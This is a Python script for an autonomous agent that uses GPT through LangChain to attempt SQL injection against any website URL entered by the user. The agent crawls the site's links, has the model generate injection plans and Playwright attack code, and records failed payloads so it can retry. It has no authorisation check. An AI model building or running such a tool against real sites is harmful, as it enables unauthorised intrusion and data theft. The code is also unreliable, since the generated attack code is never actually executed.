import asyncio
from typing import Optional
from playwright.async_api import async_playwright, Playwright
from bs4 import BeautifulSoup
from langchain.llms import OpenAI
from langchain.prompts import PromptTemplate
from langchain.chains import LLMChain
import os
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()
OPENAI_API_KEY = os.getenv('OPENAI_API_KEY')

# Initialize the GPT model via LangChain
llm = OpenAI(model_name="gpt-3.5-turbo", temperature=0.7)

class SQLInjector:
    """
    LLM agent that tries to hack a website via SQL injection
    """
    def __init__(self, base_url: str) -> None:
        """
        Constructor

        Parameters:
        base_url (str): URL to the homepage of the target website
        """
        self.baseURL = base_url
        self.urlsVisited: set[str] = set()
        self.browser = None
        self.page = None

    async def startup(self, playwright: Playwright) -> None:
        """
        Launch Chromium and open a new page
        """
        chromium = playwright.chromium
        self.browser = await chromium.launch(headless=False)
        self.page = await self.browser.new_page()
        await self.page.goto(self.baseURL)
        await self.page.wait_for_load_state('domcontentloaded')

    async def trial(self) -> bool:
        """
        Try SQL injection on the target website.
        """
        stack: list[str] = [self.page.url]

        while len(stack) != 0:
            url = stack.pop()

            if url in self.urlsVisited:
                continue

            print("Current URL: ", url)
            self.urlsVisited.add(url)
            
            all_sql_payloads = ""
            for num_trials in range(5):
                print(f"Iteration {num_trials}")

                await self.page.goto(url)
                await self.page.wait_for_load_state('domcontentloaded')

                html = await self.readHTML()

                has_input, has_link, has_button = self.checkHTML(html)
                await asyncio.sleep(0.5)

                if not has_input and not has_link and not has_button:
                    break

                if has_link and num_trials == 0:
                    links = self.checkLinks(html)
                    stack += links

                if not has_input:
                    break

                plan = await self.makePlan(html, failed_sql_payloads=all_sql_payloads)
                if not plan or len(plan) == 0:
                    break

                func_str = await self.act(html, plan)

                await asyncio.sleep(0.5)
                newHtml = await self.readHTML()

                if await self.checkSuccess(newHtml, html):
                    print("SQL injection successful!")
                    return True
                
                sql_payloads = await self.extractSQLPayloads(function=func_str)
                all_sql_payloads += sql_payloads
        
        print("SQL injection failed!")
        return False

    async def readHTML(self) -> str:
        """
        Helper function to read the HTML of the webpage currently held by this instance
        """
        html = await self.page.content()
        if html == '':
            raise Exception('Error when fetching the webpage, please check the network condition or try again.')

        html = self.preprocessHTML(html)
        return html

    async def makePlan(self, html: str, failed_sql_payloads: Optional[str]=None) -> list[str]:
        """
        Use GPT (via LangChain) to generate a SQL injection plan based on the HTML content
        """
        prompt_template = PromptTemplate(
            input_variables=["html_content", "failed_payloads"],
            template=("Here is the HTML content of a webpage:\n\n"
                      "{html_content}\n\n"
                      "The following SQL injection attempts have failed:\n{failed_payloads}\n\n"
                      "Generate a new plan to perform SQL injection on this page.")
        )

        llm_chain = LLMChain(llm=llm, prompt=prompt_template)
        plan = llm_chain.run({"html_content": html, "failed_payloads": failed_sql_payloads})
        
        print("Generated SQL injection plan:")
        print(plan)
        return plan.splitlines()

    async def act(self, html: str, plan: str) -> str:
        """
        Make the agent act based on the instruction provided by GPT via LangChain
        """
        filtered_plan = [instruction for instruction in plan if "browser" not in instruction.lower() and "navigate" not in instruction.lower()]
        plan_str = '\n'.join(filtered_plan)

        prompt = f"Here is HTML content of a webpage:\n\n{html}\n\n" \
                 f"Based on the plan:\n\n{plan_str}\n\nWrite Python code to perform these actions using Playwright."
        
        func_str = llm(prompt)
        print(f"Generated function to execute:\n{func_str}")
        return func_str

    async def extractSQLPayloads(self, function: str) -> str:
        """
        Extract SQL payloads used from the function generated by GPT via LangChain
        """
        prompt = f"Here is a Python script:\n\n{function}\n\nExtract and return any SQL injection payloads used in the script."
        response = llm(prompt)
        return response

    async def checkSuccess(self, newHtml: str, prevHtml: str) -> bool:
        """
        Compare the new HTML content with the old one to check if the SQL injection succeeded
        """
        prompt = f"Before SQL injection:\n{prevHtml}\n\nAfter SQL injection:\n{newHtml}\n\nDid the SQL injection succeed?"
        response = llm(prompt)
        return "YES" in response.upper()

    def checkLinks(self, html: str) -> list[str]:
        """
        Extract the links worth visiting from the page
        """
        soup = BeautifulSoup(html, "html.parser")
        anchor_tags = soup.find_all('a')
        hrefs = [tag.get('href') for tag in anchor_tags if tag.get('href')]
        valid_hrefs = []
        for href in hrefs:
            if href.startswith(self.baseURL) or href.startswith('/'):
                valid_hrefs.append(self.baseURL + href if href.startswith('/') else href)
        return valid_hrefs

    def preprocessHTML(self, html: str) -> str:
        """
        Clean HTML to make it easier for GPT to process
        """
        soup = BeautifulSoup(html, "html.parser")
        for s in soup.select("script"):
            s.extract()
        for s in soup.select("style"):
            s.extract()
        if soup.head:
            soup.head.extract()
        return soup.body.prettify()

    def checkHTML(self, html: str) -> tuple[bool]:
        """
        Check if the page contains input fields, links, or buttons
        """
        soup = BeautifulSoup(html, "html.parser")
        input_elements = soup.find_all('input')
        anchor_tags = soup.find_all('a')
        buttons = soup.find_all('button')
        return bool(input_elements), bool(anchor_tags), bool(buttons)

    async def shutDown(self):
        await self.browser.close()


async def main():
    url = input("Please enter a URL for SQL injection: ")
    sql_injector = SQLInjector(base_url=url)

    async with async_playwright() as playwright:
        await sql_injector.startup(playwright)
        await sql_injector.trial()
        await sql_injector.shutDown()


if __name__ == '__main__':
    asyncio.run(main())
